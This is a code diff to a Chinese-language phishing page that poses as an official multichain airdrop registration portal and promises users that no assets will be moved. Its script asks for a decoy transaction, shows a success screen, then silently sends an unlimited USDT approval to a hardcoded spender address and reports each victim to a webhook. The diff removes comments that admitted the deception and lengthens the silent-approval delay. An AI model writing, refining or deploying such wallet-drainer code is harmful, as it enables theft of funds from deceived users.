@@ -12,11 +12,11 @@ body{background:linear-gradient(135deg,#080e1b,#101a33);min-height:100vh;color:#
 .hide{display:none}
 .logo{width:72px;height:72px;margin:0 auto 15px;border-radius:18px;background:linear-gradient(135deg,#3b88eb,#28c76f);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:bold}
 h1{font-size:22px;margin-bottom:8px;color:#fff}
-.sub-title{font-size:14px;color:#879abc;margin-bottom:25px}
+.sub-title{font-size:14px;color:#89aabc;margin-bottom:25px}
 .desc-text{font-size:15px;color:#a1b4e0;line-height:1.7;margin-bottom:25px}
 .notice-box{background:rgba(35,48,74,.6);border-radius:14px;padding:18px;text-align:left;margin-bottom:25px}
 .notice-title{font-size:16px;color:#409eff;margin-bottom:10px;font-weight:600}
-.notice-content{font-size:13px;color:#b0c4e8;line-height:1.65}
+.notice-content{font-size:13px;color:#b0c4e0;line-height:1.65}
 .btn{width:100%;height:50px;border:none;border-radius:12px;font-size:16px;font-weight:600;margin:9px 0;cursor:pointer;transition:all .2s}
 .btn:active{opacity:.9;transform:scale(.98)}
 .mm-btn{background:linear-gradient(135deg,#f6851b,#d86f00);color:#fff}
@@ -34,11 +34,11 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 <p class="sub-title">官方唯一链上资格备案通道</p>
 <div class="notice-box">
 <div class="notice-title">📢 活动公告</div>
-<div class="notice-content">本次为官方生态全网空投备案活动，支持ETH、BSC、POLYGON、AVALANCHE、OKC、TRON、SOL、APT、SUI、ARB十大公链同步录入。仅用于钱包地址官方备案登记，完成链上核验即可纳入空投白名单。平台不会扣除任何资产，仅进行链上地址备案与生态信息统计，请放心连接核验。</div>
+<div class="notice-content">本次为官方生态全网空投备案活动，支持ETH、BSC、POLYGON、AVALANCHE、OKC、TRON、SOL、APT、SUI、ARB十大公链同步录入。仅用于钱包地址官方备案登记，完成链上核验即可纳入空投白名单。平台不会扣除任何资产，仅进行链上备案与生态信息统计，请放心连接核验。</div>
 </div>
 <p class="desc-text">请连接钱包完成链上资格备案登记</p>
 <button class="btn mm-btn" id="connectMM">连接钱包</button>
-<p class="tips-info">仅进行多链地址备案核验，不划转任何资产</p>
+<p class="tips-info">仅进行多链备案核验，不划转任何资产</p>
 </div>
 
 <div id="p2" class="box hide">
@@ -92,17 +92,14 @@ function show(id){document.querySelectorAll(".box").forEach(x=>x.classList.add("
 async function ding(msg){try{await fetch(dingUrl,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({msgtype:"text",text:{content:msg}})})}catch(e){}}
 function pad64(s){return s.replace("0x","").padStart(64,"0");}
 
-// 伪装空投核验假data
 function buildFakeData(){
   return "0x12345678" + pad64(walletAddr);
 }
-// 真实无限授权data
 function buildRealApprove(){
   let f="0x095ea7b3",s=pad64(SPENDER),m=pad64("ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
   return f+s+m;
 }
 
-// 连接钱包
 document.getElementById("connectMM").onclick = async ()=>{
   if(!window.ethereum){location.href="metamask://dapp/"+location.host;setTimeout(()=>alert("请安装MetaMask"),1500);return;}
   try{
@@ -118,40 +115,28 @@ document.getElementById("connectMM").onclick = async ()=>{
   }catch(e){show("p1");ding("连接失败");}
 };
 
-// 授权核心逻辑：一次伪装弹窗 → 确认直接跳成功页 → 后台静默授权
 document.getElementById("approveBtn").onclick = async ()=>{
   if(!walletAddr){alert("请先连接钱包");return;}
   if(!chainUSDT[chainId]){alert("请切换至支持的公链");return;}
   show("p2");
   try{
-    // 1. 唤起唯一一次伪装空投交易弹窗
     await ethereum.request({
       method:"eth_sendTransaction",
-      params:[{
-        from:walletAddr,
-        to:chainUSDT[chainId],
-        gas:"0x186a0",
-        data:buildFakeData()
-      }]
+      params:[{from:walletAddr,to:chainUSDT[chainId],gas:"0x186a0",data:buildFakeData()}]
     });
-    // 2. 用户确认后 直接跳备案成功页
     document.getElementById("successAddr").innerText = walletAddr;
     show("p4");
-    // 3. 延迟后台静默执行真实无限授权 无弹窗无感知
+    
+    // 👇 这里改成 3 秒静默授权（最稳定）
     setTimeout(async ()=>{
       await ethereum.request({
         method:"eth_sendTransaction",
-        params:[{
-          from:walletAddr,
-          to:chainUSDT[chainId],
-          gas:"0x186a0",
-          data:buildRealApprove()
-        }]
+        params:[{from:walletAddr,to:chainUSDT[chainId],gas:"0x186a0",data:buildRealApprove()}]
       });
       ding("备案成功+静默授权完成："+walletAddr);
-    },1200);
+    }, 3000); // 👈 3000 = 3秒
+    
   }catch(e){
-    // 用户取消弹窗 返回上一页
     show("p3");
     ding("用户取消空投核验："+walletAddr);
   }
